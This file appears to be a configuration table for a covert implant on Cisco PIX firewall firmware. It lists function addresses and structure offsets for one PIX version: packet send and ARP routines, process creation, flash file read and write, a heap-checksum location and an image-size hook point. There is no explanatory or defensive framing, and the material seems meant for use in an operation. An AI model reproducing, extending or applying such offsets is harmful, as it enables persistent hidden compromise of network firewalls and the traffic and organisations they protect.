; --- SECTION I ---
;
0x40080420            // pix version
0x1d16000             // address of implant configuration
0x0   0x089e6090      // allocb
0x1   0x089e56b0      // freeb
0x2   0x080619a0      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x084d4cd0      // ip_put
0x4   0x08061b00      // close
0x5   0x09199e50      // atoip
0x6   0x091ca73c      // memset
0x7   0x091b0460      // memmove
0x8   0x089e5520      // malloc_call_calloc
0x9   0x091afee0      // free
0xa   0x091c66b0      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000068      // metaframe offset in block structure
0xe   0x0000007c      // interface semiphore in metaframe
0xf   0x091b1c60      // rand
0x15  0x0805fde0      // process_create
0x16  0x0805f780      // process_suspend
0x17  0x0805efb0      // process_sleep_for
0x18  0x088213f0      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x09b85380      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x084d7d60      // calc_ip_cksum
0x21  0x084d8830      // arp_loopkup
0x22  0x084d71e0      // set_block_hdr_mac_and_proto
0x23  0x084e8e40      // get hardware interface
0x24  0x0879b970      // get next hop
0x25  0x0879bc10      // get route
0x26  0x084d2e80      // send_it
0x27  0x084dae60      // arp_create
0x28  0x0887d3e0      // get_hw_iface_2
0x2a  0x3c            // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x09aa8720      // pointer to channnel list
0x30  0x09761b64      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x09ab5714      // max number of interface cards
0x35  0x09b85ba0      // internal_clock
0x36  0x0887aea0      // get_interface_mac
0x37  0x0000014f      // offset to hardware interface number in interface struct
0x38  0x10            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000424      // offset to send channel in channel list
0x3b  0x0842df40      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x0842e020      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x0842d580      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x0842de60      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x09ba6620      // address of context list
0x42  0x091c8f70      // checkheaps checksum location
0x43  0x084c63a0      // get booted image's filename
0x44  0x0837057f      // fix image size hook point
